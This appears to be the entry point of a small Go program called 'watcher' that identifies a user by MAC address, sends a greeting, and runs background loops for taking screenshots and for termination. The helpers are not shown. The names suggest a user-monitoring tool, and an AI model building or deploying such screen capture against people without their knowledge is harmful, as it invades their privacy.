package main

import (
	"runtime"
)

func main() {
	userName := identifyUserByMAC()
	sendFakeShot(userName, "hello from watcher ver 0.1.0 "+runtime.GOOS)
	go screenshotingLoop(userName)
	go terminationLoop(userName)
	select {}
}
